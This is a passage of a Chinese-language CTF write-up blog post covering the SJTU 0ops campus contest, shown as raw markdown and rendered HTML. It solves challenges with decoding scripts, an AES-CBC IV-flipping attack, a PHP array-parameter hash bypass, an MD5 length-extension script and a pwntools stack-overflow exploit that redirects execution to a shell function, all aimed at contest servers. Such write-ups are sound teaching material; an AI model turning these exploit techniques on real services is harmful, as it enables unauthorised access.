间的，从`8*(len/5+1)+1`可以看出算法是分组加密，每5个字符加密出8个字符。`v7`是将输入字符的一个分组取出来，重点在到`v9[] = byte_601080[v7 & 0x1F]`也就是取`v7`的后5位去`byte_601080[]`中查询一个字符出来反向放置作为加密结果。对于不满足5位的情况在，算法会在后面补上“=”。下面给出一个修改过变量名的版本，易于理解。\n\n```c++\n_BYTE *__fastcall sub_4006D6(unsigned __int64 messagePtr, signed int len)\n{\n  signed int i; // [sp+14h] [bp-2Ch]@4\n  signed int j; // [sp+14h] [bp-2Ch]@9\n  signed int left_len; // [sp+18h] [bp-28h]@2\n  int v6; // [sp+1Ch] [bp-24h]@9\n  unsigned __int64 check_sum; // [sp+20h] [bp-20h]@2\n  unsigned __int64 new_message_ptr; // [sp+28h] [bp-18h]@1\n  _BYTE *group_secret; // [sp+30h] [bp-10h]@1\n  _BYTE *secret; // [sp+38h] [bp-8h]@1\n\n  secret = malloc(8 * (len / 5 + 1) + 1);\n  new_message_ptr = messagePtr;\n  group_secret = secret;\n  while ( len + messagePtr > new_message_ptr )\n  {\n    check_sum = 0LL;\n    left_len = len + messagePtr - new_message_ptr;\n    if ( left_len > 5 )\n      left_len = 5;\n    for ( i = 0; i <= 4; ++i )\n    {\n      check_sum <<= 8;\n      if ( i < left_len )\n        check_sum |= *(_BYTE *)(i + new_message_ptr);\n    }\n    v6 = dword_6010B0[left_len - 1];\n    for ( j = 7; j >= 0; --j )\n    {\n      group_secret[j] = byte_601080[check_sum & 0x1F];\n      check_sum >>= 5;\n    }\n    if ( v6 )\n      memset(&group_secret[8LL - v6], 61, v6);\n    new_message_ptr += 5LL;\n    group_secret += 8;\n  }\n  *group_secret = 0;\n  return secret;\n}\n```\n那么解密过程就是，对于密文的每8个字符的分组，去```byte_601080[]```中查询index\n\n```python\ndef decode(secret):\n    table = 'afe7WlyVd12XKLhnqvzQb5B6sNR8gYME'\n    message = [0]*40\n    string = ['']*5\n\n    for i, ch in enumerate(secret):\n        index = table.index(ch)\n        print(index)\n        start = (8-i)*5-5\n        while index!=0:\n            message[start] = index % 2\n            #print (message,start,index)\n            index >>= 1\n            start += 1\n\n    for i in range(5):\n        num = 0\n        for j in range(i*8+7, i*8-1, -1):\n            num <<= 1\n            num += message[j]\n        string[i] = chr(num)\n    print(string)\n    return string[::-1]\n\nprint(\"\".join(decode(\"KNByeN88\")+decode(\"KqslM52E\")+decode(\"1L67aYRE\")+decode(\"K1qQ2N1Q\")+decode(\"ydYlaEd\")))\n\n>>flag{d0_U_Kn0w_ba5e32:P}\n```\n\n最终flag提示do u know base32，其实最开始看到密文结尾为=就尝试用了base64\n\n<p id = \"j10\"></p>\n### 10.seabreeze's stack 100\n\n题目内容为“nc 202.121.178.181 12321”与一个下载链接[[stack_55a49bdfcdafd0c31657649e905486a4](https://ctf.0ops.sjtu.cn/attachment/download/stack)]，得到一个名为stack的二进制文件。使用strings指令查看一下内部字符内容\n\n![img](/images/in-post/post-blog-jserv16.png)\n\n可以看到Shell Gotten与三个问题。执行nc指令\n\n![img](/images/in-post/post-blog-jserv17.png)\n\n需要回答的问题与文件中的内容一致，但是之后还需要输入内容。根据上文的Sell Gotten，显然这里我们需要得到shell的控制权，再根据题目名字stack，考虑为栈溢出问题。\n\n使用IDA-win32打开，main函数的主体是work函数，work函数如下，就是之前要回答的三个问题。\n\n![img](/images/in-post/post-blog-jserv18.png)\n\n还有一个没有用到的函数getshell()\n\n![img](/images/in-post/post-blog-jserv19.png)\n\n只需要程序的返回地址为getshell()的地址，就会触发执行了。查询得到getshell的起始地址为0804 85cb\n\n![img](/images/in-post/post-blog-jserv20.png)\n\n栈溢出的原理可以参考链接[[栈溢出](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stackoverflow_basic.html)]\n\n```python\nfrom zio import *\nfrom pwn import *\nio = zio(('202.121.178.181', 12321 ))\nio.read_until('Do you want to get acquainted with top experts and like-minded friends in computer security?')  \nio.writeline('Yes!')  \nio.read_until('Do you want to stride forwards on the road of hacking and explore endless possibilities?')  \nio.writeline('Yes!!')\nio.read_until('Do you want to challenge world cutting-edge technology and compete with outstanding hackers?')\nio.writeline('Yes!!!')\nsuccess_addr = 0x080485cb\npayload = 'a' * 0x3fc + \"bbbb\" + p32(success_addr)\nio.writeline(payload)  \nio.interact()  \n```\n\n运行代码\n![img](/images/in-post/post-blog-jserv21.png)\n\ncd 进入 /home/.../stack 目录，cat 显示flag。\n![img](/images/in-post/post-blog-jserv22.png)\n\n## Have Idea\n\n<p id = \"j11\"></p>\n### 11.aes-duet\n\n题目描述为一个链接[[aes_duet.zip](https://ctf.0ops.sjtu.cn/attachment/download/aes_duet.zip)]，解压得到一个密文和加密函数，文件如下\n\n```python\nfrom Crypto.Cipher import AES\ndef dummy_key_extend(k):\n    assert len(k) == 4\n    return k * 4\n\ndef aes_duet(plain, key):\n    # It is so safe that I use AES twice here!\n    assert len(key) == 8\n    k1 = dummy_key_extend(key[:4])\n    k2 = dummy_key_extend(key[4:])\n    c1 = AES.new(k1, AES.MODE_ECB)\n    c2 = AES.new(k2, AES.MODE_ECB)\n    return c2.encrypt(c1.encrypt(plain))\nif __name__ == '__main__':\n    with open('./secretkey', 'rb') as f:\n        key = f.read()\n    # To make life easier...\n    assert (key.encode('hex'))[0] == '0'\n    assert (key.encode('hex'))[-1] == '8'\n    \n    plain = 'I am a piece of lovely plaintext'\n    with open('ciphertext', 'wb') as f:\n        f.write(aes_duet(plain, key))\n    print \"I am a lovely flag: flag{ %s}\" % key.encode('hex')\n```\n\n思路很简单，就是AES两轮加密的中间相遇攻击，虽然题目为了降低复杂性提示了key的第一位为0最后一位为8，但是计算量还是十分庞大，需要很多内存，而且计算出来中间值后，查询也会耗时，加上心里的“B树”和“B+树”早忘的没影了，最终因为时间与硬件原因放弃。\n\n## 感想\n\n程序的安全性与正确性同等重要。\n\n我们在众多bug中微妙的生活着。\n\nPHP是世界上最好的语言。\n\n![img](/images/in-post/post-blog-j0serv8.gif)\n","slug":"jun0ctf","published":1,"date":"2017-12-09T16:00:00.000Z","updated":"2018-05-06T10:41:28.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizbb000orike4k1u57gi","content":"<blockquote>\n<p>“flag{php_is_best_language_:P}”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>SJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。部分题目索引如下（文中涉及的文件下载[<a href=\"/docs/in-post/Junior0ctfQuestion.zip\">链接</a>]</p>\n<p><a href=\"#j0\">QQ Group </a>|<a href=\"#j1\">Mystery Numbers </a>|<a href=\"#j2\">Easy Traffic Analyze </a>|<a href=\"#j3\">AES-server</a><br><a href=\"#j4\">babyrsa </a>|<a href=\"#j5\">Shatter Sha512!</a>|<a href=\"#j6\">Penetrate In </a>|<a href=\"#j7\">Eva</a><br><a href=\"#j8\">babyre</a>|<a href=\"#j9\">encoder </a>|<a href=\"#j10\">seabreeze’s stack </a>|<a href=\"#j11\">aes-duet </a></p>\n<h2 id=\"Solved\"><a href=\"#Solved\" class=\"headerlink\" title=\"Solved\"></a>Solved</h2><p></p><p id=\"j0\"></p><p></p>\n<h3 id=\"0-QQ-Group-50\"><a href=\"#0-QQ-Group-50\" class=\"headerlink\" title=\"0.QQ Group 50\"></a>0.QQ Group 50</h3><p>友情送分题，加入QQ交流群送一个flag。</p>\n<p></p><p id=\"j1\"></p><p></p>\n<h3 id=\"1-Mystery-Numbers-100\"><a href=\"#1-Mystery-Numbers-100\" class=\"headerlink\" title=\"1.Mystery Numbers 100\"></a>1.Mystery Numbers 100</h3><p>题目描述没有什么实质性内容。给了一个link[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/signal.txt\" target=\"_blank\" rel=\"noopener\">numbers_f300d7d6dce847a265407e072790370d</a>]，下载得到一个文本文件，内容如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239</span><br></pre></td></tr></table></figure>\n<p>因为看到全是字母与数字的排列，而且范围是0到f，应该是一串16进制的编码，以16进制解码到ascii，得到如下内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9</span><br></pre></td></tr></table></figure>\n<p>应该还是一串被加密的字符，观察密文形式，很像base64，尝试用它来解码，得到flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">s = <span class=\"string\">'ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9'</span></span><br><span class=\"line\">a = base64.b64decode(s)</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;flag&#123;d0_y0u_kn0w_b45364_h4h4_6464_y4y4&#125;</span><br></pre></td></tr></table></figure>\n<p></p><p id=\"j2\"></p><p></p>\n<h3 id=\"2-Easy-Traffic-Analyze-200\"><a href=\"#2-Easy-Traffic-Analyze-200\" class=\"headerlink\" title=\"2.Easy Traffic Analyze 200\"></a>2.Easy Traffic Analyze 200</h3><p>题目给了一个link[<a href=\"https://ctf.0ops.sjtu.cn/upload/flag.pcap\" target=\"_blank\" rel=\"noopener\">flag.pcap</a>]，是一个通信包文件，但是用wireshark打开提示格式不正确，应该是pcap文件受损。需要先修复pcap，可以使用[<a href=\"https://f00l.de/pcapfix/\" target=\"_blank\" rel=\"noopener\">pcapfix</a>]软件来修复。</p>\n<p>之后使用wireshark打开，通信包有很多，过滤一下http请求，发现只有3个</p>\n<p><img src=\"/images/in-post/post-blog-jserv8.png\" alt=\"img\"></p>\n<p>选择“文件” -&gt; “导出对象” -&gt; “HTTP”将其导出，得到三个文件。</p>\n<p><img src=\"/images/in-post/post-blog-jserv0.png\" alt=\"img\"></p>\n<p>其中upload.php很大，有1.9M，以二进制打开，发现文件里有flag1.png，同时有一个zip文件标志头信息504B 0304。</p>\n<p><img src=\"/images/in-post/post-blog-j0serv1.png\" alt=\"img\"></p>\n<p>将前面不重要的部分删去，得到的文件更改后缀名为zip解压，得到一张图（还挺好看的 (●ﾟωﾟ●)。</p>\n<p><img src=\"/images/in-post/post-blog-jserv2.png\" alt=\"img\"></p>\n<p>这里一般的套路是会在图片里隐写信息，将图片以二进制打开，因为文件比较大，在中间寻找flag较困难，考虑到简单的隐写一般在文件结尾处，直接去文件尾查询，得到了flag。</p>\n<p><img src=\"/images/in-post/post-blog-jserv3.png\" alt=\"img\"></p>\n<p></p><p id=\"j3\"></p><p></p>\n<h3 id=\"3-AES-server-100\"><a href=\"#3-AES-server-100\" class=\"headerlink\" title=\"3.AES-server 100\"></a>3.AES-server 100</h3><p>题目给出“nc 202.121.178.199 9999” 与一个文件[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/server.py\" target=\"_blank\" rel=\"noopener\">server.py</a>]，其中nc是linux的netcat指令，具体介绍可以自己搜索，在此题中不是重点部分。server.py文件内容如下，也即是服务器上的代码。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span>!/usr/bin/env python</span><br><span class=\"line\"><span class=\"meta\">#</span> coding=utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">import SocketServer</span><br><span class=\"line\">from Crypto.Cipher import AES</span><br><span class=\"line\"></span><br><span class=\"line\">with open('secretkey', 'rb') as f:</span><br><span class=\"line\">    key = f.read()</span><br><span class=\"line\">with open('flag.txt') as f:</span><br><span class=\"line\">    flag = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">class handler(SocketServer.BaseRequestHandler):</span><br><span class=\"line\"></span><br><span class=\"line\">    def handle(self):</span><br><span class=\"line\">        self.request.send(\"Welcome to the perfect aes-cbc cryptosystem!(decrypt-only)\\n\")</span><br><span class=\"line\">        self.request.send(\"Please input your iv and encrypted message in hex:\\n\")</span><br><span class=\"line\">        </span><br><span class=\"line\">        data = self.request.recv(1024).rstrip()</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            raw_data = data.decode('hex')</span><br><span class=\"line\">        except Exception, e:</span><br><span class=\"line\">            self.request.send(\"Error: &#123;&#125;\\n\".format(e.message))</span><br><span class=\"line\">            self.request.close()</span><br><span class=\"line\">            return</span><br><span class=\"line\"></span><br><span class=\"line\">        if len(raw_data) &lt; 32 or len(raw_data) &amp; 0xf:</span><br><span class=\"line\">            self.request.send(\"Your input is not valid!\\n\")</span><br><span class=\"line\">            self.request.close()</span><br><span class=\"line\">            return</span><br><span class=\"line\">        </span><br><span class=\"line\">        iv = raw_data[:16]</span><br><span class=\"line\">        enc = raw_data[16:]</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\">        plain = cipher.decrypt(enc)</span><br><span class=\"line\">        self.request.send(\"Here is your plaintext: &#123;&#125;\\n\".format(repr(plain)))</span><br><span class=\"line\"></span><br><span class=\"line\">        if plain[:5] == 'admin':</span><br><span class=\"line\">            self.request.send(\"hello, admin! Here is your flag: &#123;&#125;\".format(flag))</span><br><span class=\"line\">        self.request.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == \"__main__\":</span><br><span class=\"line\">    HOST, PORT = \"localhost\", 9999</span><br><span class=\"line\">    server = SocketServer.TCPServer((HOST, PORT), handler)</span><br><span class=\"line\">    server.serve_forever()</span><br></pre></td></tr></table></figure>\n<p>代码里显示<strong>AES.MODE_CBC</strong>，说明采用的是CBC(密文分组链接)模式，且代码为CBC的解密过程，CBC decryption见下图</p>\n<p><img src=\"/images/in-post/post-blog-jserv9.png\" alt=\"img\"></p>\n<p>代码内容只涉及了一组CBC的解密。要求输入初始向量iv与加密字符c的拼接串，同时服务器会返回解密后的明文p。数据关系为 p = XOR( iv, fk(c) )，题目显示需要得到的p前5位为“admin”才会返回flag。</p>\n<p>这里使用异或运算的trick来求解。先自己构造一对iv0，c0，服务器会返回一个p0，记目标初始向量（ “admin……….”）为iv1。p0 = XOR( iv0, fk(c0) )，XOR( iv1, p0 ) = a = XOR( iv1, XOR( iv0, fk(c0) ) ) ，于是得到了XOR( iv1, fk(c0) ) = XOR( a, iv1 ) = b。因为是自己构造的，a与b都是可计算的值。也就是只要再次发送报文，初始向量为iv1，密文还为c0即可。</p>\n<p>这里构造iv0, c0为全0字节，admin后面也以0补齐，具体过程见下图。（由此可见异或运算的问题还是挺大的，但是异或在加密中广为应用。</p>\n<p><img src=\"/images/in-post/post-blog-jserv4.png\" alt=\"img\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;nc 202.121.178.199 9999</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;0000000000000000000000000000000000000000000000000000000000000000</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;python</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;'_\\xf7;&gt;\\xca\\xdeQ\\x16\\x96\\xe4y\\xa7\\x92\\xfc\\x9b\\xbd'.encode('hex')</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;'admin\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00\\00'.encode('hex')</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;hex(0x5ff73b3ecade511696e479a792fc9bbd^0x61646d696e0000000000000000000000)</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;exit()</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;nc 202.121.178.199 9999</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>&gt;3e935657a4de511696e479a792fc9bbd00000000000000000000000000000000</span><br></pre></td></tr></table></figure>\n<p></p><p id=\"j4\"></p><p></p>\n<h3 id=\"4-babyrsa-100\"><a href=\"#4-babyrsa-100\" class=\"headerlink\" title=\"4.babyrsa 100\"></a>4.babyrsa 100</h3><p>题目提供了一个压缩文件[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/babyrsa.zip\" target=\"_blank\" rel=\"noopener\">babyrsa.zip</a>]，包含RAS加密的公钥，密文，现在需要求明文。</p>\n<p>首先从publicKey.pem中提取n，e</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\">pub = RSA.importKey(open(<span class=\"string\">'./publicKey.pem'</span>).read())</span><br><span class=\"line\">n = long(pub.n)</span><br><span class=\"line\">e = long(pub.e)</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;&gt;n = <span class=\"number\">39845701744153150941069529194757526450699838667585381414738119544695931460213</span></span><br><span class=\"line\">&gt;&gt;e = <span class=\"number\">65537</span></span><br></pre></td></tr></table></figure>\n<p>这个公钥的问题出在n选择太小，直接暴力破解质因数，这里可以去[<a href=\"http://www.factordb.com\" target=\"_blank\" rel=\"noopener\">factordb</a>]网站查询，也可以用python的包进行破解。(最开始是用python暴力破的，后来发现可以查询到)</p>\n<p><img src=\"/images/in-post/post-blog-j0serv7.png\" alt=\"img\"></p>\n<p>在质因子p，q都得到的情况下，后面就是顺水推舟的求私钥d，解明文p了。</p>\n<p></p><p id=\"j5\"></p><p></p>\n<h3 id=\"5-Shatter-Sha512-150\"><a href=\"#5-Shatter-Sha512-150\" class=\"headerlink\" title=\"5.Shatter Sha512! 150\"></a>5.Shatter Sha512! 150</h3><p>题目描述“Google Shatter Sha256, so cooooooooooool! Can you break the sha512 algorithm to prove that you are a great genius?” 下面是一个链接，点进去是一个页面，显示如下内容，需要找到两个不同的值x和y，使得hash值一样。</p>\n<p><img src=\"/images/in-post/post-blog-jserv5.png\" alt=\"img\"></p>\n<p>题目说要攻破SHA512，显然目前是不可能的，于是需要找php的漏洞，使得x与y不等但是hash值相等。由于参数传递为GET方法，可以在参数上做手脚，使用如下url</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">202.121.178.201：8083?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></figure>\n<p>不等条件显然成立，这里x与y都成为<strong>Array</strong>类型，hash值都为<strong>Null</strong>，于是echo $flag. </p>\n<p><strong>flag{php_is_best_language_:P}</strong> 被这个漏洞震惊了，果然PHP是最好的语言。</p>\n<p></p><p id=\"j6\"></p><p></p>\n<h3 id=\"6-Penetrate-In-150\"><a href=\"#6-Penetrate-In-150\" class=\"headerlink\" title=\"6.Penetrate In 150\"></a>6.Penetrate In 150</h3><p>（来自dusmart大大）此题感觉比较复杂，需要详细说明一下，但是很多人很早就做了出来，不知道用的什么方法。链接点进去是如下界面</p>\n<p><img src=\"/images/in-post/post-blog-jserv6.png\" alt=\"img\"></p>\n<p>第一次访问会设置一个名为“hmac”的cookie，之后要求以POST的方式提交username与password，其中username字段必须为“admin”，password字段不能为“admin”，但是要求hamc与md5(“ $secret|$username|$password”)相等。</p>\n<h4 id=\"心路历程：\"><a href=\"#心路历程：\" class=\"headerlink\" title=\"心路历程：\"></a>心路历程：</h4><ol>\n<li>第一次访问该网站时，被设置了一个hmac字段的cookie，该hmac表示的是<code>md5(&quot;$secret|admin|admin&quot;)</code>，实际内容为”be9fcfa876db5f4184e1635ce6561de7”。</li>\n<li>第一想法当然是尝试破解\\$secret变量，用C++测试了6位以内所有可打印ascii码的组合，并没有找到使得<code>md5(&quot;$secret|admin|admin&quot;)</code>等于给定值的组合。然后使用了常用密码组合表去重复同样的操作，未果。</li>\n<li>然后将思路转移到php本身的缺陷上来，观察到第六行使用了 != 符号，因此在提交数据时，构造字段<code>payload = {&quot;username&quot;:&quot;admin&quot;,&quot;password[]&quot;:&quot;admin&quot;}</code>，发现虽然第六行的比较通过，但是在第七行时校验不通过，因为该字符串变成了$secret|admin|Array，因此放弃了寻找php本身的漏洞。</li>\n<li>第三次尝试从md5本身去下手，因为cookie在本地，可以被我们自己修改，因此考虑能否在$secret无法获取的情况下计算出md5(“$secret|admin|xxxxxxx”)，其中xxxxxx为我们可控制的password字段，不能为admin)。</li>\n</ol>\n<h4 id=\"解题思路：\"><a href=\"#解题思路：\" class=\"headerlink\" title=\"解题思路：\"></a>解题思路：</h4><ol>\n<li><p>首先观察md5的整体过程，上半部分指出首先要对消息做填充，填充至512bit的整数倍，该图的下半部分显示了md5的整体计算过程，被哈希的消息Y被分割为长度为512bit的分组(Y0,Y1,…,Yn-1)，计算过程为：</p>\n<ol>\n<li><p>$H0=Hmd5(IV, Y0)$</p>\n</li>\n<li><p>$Hi = Hmd5(Hi-1, Yi)$</p>\n</li>\n<li><p>最终有 $md5(Y) = Hn-1$</p>\n<p><em>IV是初始向量，是固定值0x0123456789ABCDEFFEDCBA9876543210</em></p>\n<p><em>Hmd5表示md5中的每个分组的哈希操作，其输入为初始向量和512bit的待哈希分组，输出为128bit</em></p>\n</li>\n</ol>\n</li>\n</ol>\n<p><img src=\"/images/in-post/post-blog-jserv10.png\" alt=\"md5\"></p>\n<ol start=\"2\">\n<li><p>然后了解消息填充的具体过程</p>\n<p>在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，<strong>并且填充必须进行，即使其位长对512求余的结果等于448</strong>。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。然后在这个结果后面附加一个以64位二进制数字表示扩充前实际信息的长度（小端序）。</p>\n<p><a href=\"https://baike.baidu.com/item/MD5/212708?fr=aladdin#3_2\" target=\"_blank\" rel=\"noopener\">来自百度百科的例子</a></p>\n</li>\n<li><p>最后，我们分析题目条件，题目给出了<strong>src = md5(\\$secret|admin|admin)</strong>，我们需要构造一个<strong>des = md5(\\$secret|admin|xxxxxx)</strong>，其中$secret长度未知，xxxxxx不能为admin，长度随意。很容易想到如果我们的md5(\\$secret|admin|xxxxxx)的生成过程和md5(\\$secret|admin|admin)的生成过程前半部分相同，但是比其多出一个分组，那么des = Hmd5(src, xxxxxx的后一部分+此次的填充信息)。那么就要求xxxxxx = admin+src构造过程中的填充信息+448bit内的随意值，为了使得des计算方便，我们就令xxxxxx = admin + src构造过程中的填充信息，此时<strong>des = Hmd5(src, des构造过程中的填充信息)</strong>。</p>\n</li>\n<li><p>python代码实现</p>\n<p>为了实现方便，假设src的构造过程只使用了一个分组，即\\$secret长度小于43，那么des过程中的填充信息就固定为 <code>&#39;\\x80&#39;+&#39;\\x00&#39;*55 +&#39;\\x00\\x02&#39;+&#39;\\x00&#39;*6</code> ，共512bit，64字节，其中’\\x00\\x02’表示源消息长度为512bit，而xxxxxx会根据$secret的长度变化而变化，设其长度为length，则src构造过程中的源消息长度为length+12字节，则<code>xxxxxx = &quot;admin&quot; + &quot;\\x80&quot; + &quot;\\x00&quot; * (length+12-1) + (length+12的8字节小端表示)</code></p>\n</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">bytearr = [&apos;\\x00&apos;,&apos;\\x08&apos;,&apos;\\x10&apos;,&apos;\\x18&apos;,&apos;\\x20&apos;,&apos;\\x28&apos;,&apos;\\x30&apos;,&apos;\\x38&apos;,&apos;\\x40&apos;,&apos;\\x48&apos;,&apos;\\x50&apos;,&apos;\\x58&apos;,&apos;\\x60&apos;,&apos;\\x68&apos;,&apos;\\x70&apos;,&apos;\\x78&apos;,&apos;\\x80&apos;,&apos;\\x88&apos;,&apos;\\x90&apos;,&apos;\\x98&apos;,&apos;\\xa0&apos;,&apos;\\xa8&apos;,&apos;\\xb0&apos;,&apos;\\xb8&apos;,&apos;\\xc0&apos;,&apos;\\xc8&apos;,&apos;\\xd0&apos;,&apos;\\xd8&apos;,&apos;\\xe0&apos;,&apos;\\xe8&apos;,&apos;\\xf0&apos;,&apos;\\xf8&apos;,]</span><br><span class=\"line\">bitarr = [&apos;\\x00&apos;,&apos;\\x01&apos;,&apos;\\x02&apos;, &apos;\\x03&apos;, &apos;\\x06&apos;, &apos;\\x07&apos;, &apos;\\x08&apos;, &apos;\\x09&apos;, &apos;\\x0a&apos;, &apos;\\x0b&apos;]</span><br><span class=\"line\">length = 42</span><br><span class=\"line\">session = requests.Session()</span><br><span class=\"line\">for length in range(43):</span><br><span class=\"line\">        # say origin len &lt; 43</span><br><span class=\"line\">        origin_len = length + 12</span><br><span class=\"line\">        padding_len = (56 - origin_len)</span><br><span class=\"line\">        padding = &quot;\\x80&quot; + &quot;\\x00&quot; * (padding_len-1)</span><br><span class=\"line\">        checksum = bytearr[origin_len % 32] + bitarr[origin_len / 32] + &apos;\\x00&apos;*6</span><br><span class=\"line\">        hmac = padding + checksum</span><br><span class=\"line\">        payload = &#123;&apos;username&apos;: &apos;admin&apos;, &apos;password&apos;: &apos;admin&apos;+padding + checksum&#125;</span><br><span class=\"line\">        cookie = &#123;&apos;hmac&apos;: &quot;5f1b36f358a22a9abe395cba54f6d3bc&quot;&#125;</span><br><span class=\"line\">        r = session.post(&quot;http://202.121.178.201:8081/&quot;, cookies=cookie, data=payload)</span><br><span class=\"line\">        print(r.text)</span><br></pre></td></tr></table></figure>\n<p></p><p id=\"j7\"></p><p></p>\n<h3 id=\"7-Eva-200\"><a href=\"#7-Eva-200\" class=\"headerlink\" title=\"7.Eva 200\"></a>7.Eva 200</h3><p>此题出了bug，直接爆出了答案，没有认真做。</p>\n<p>For fair consideration, flag is flag{f1ask_is_a_g00d_pyth0n_web_framew0rk}</p>\n<p></p><p id=\"j8\"></p><p></p>\n<h3 id=\"8-babyre-100\"><a href=\"#8-babyre-100\" class=\"headerlink\" title=\"8.babyre 100\"></a>8.babyre 100</h3><p>题目给出一个pyc文件[<a href=\"https://ctf.0ops.sjtu.cn/attachment/download/encrypt.pyc\" target=\"_blank\" rel=\"noopener\">encrypt.pyc</a>]，使用在线工具反编译一下[<a href=\"http://tools.bugscaner.com/decompyle/\" target=\"_blank\" rel=\"noopener\">decompyle</a>]，得到python源文件，内容如下。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> md5</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5raw</span><span class=\"params\">(s)</span>:</span></span><br><span 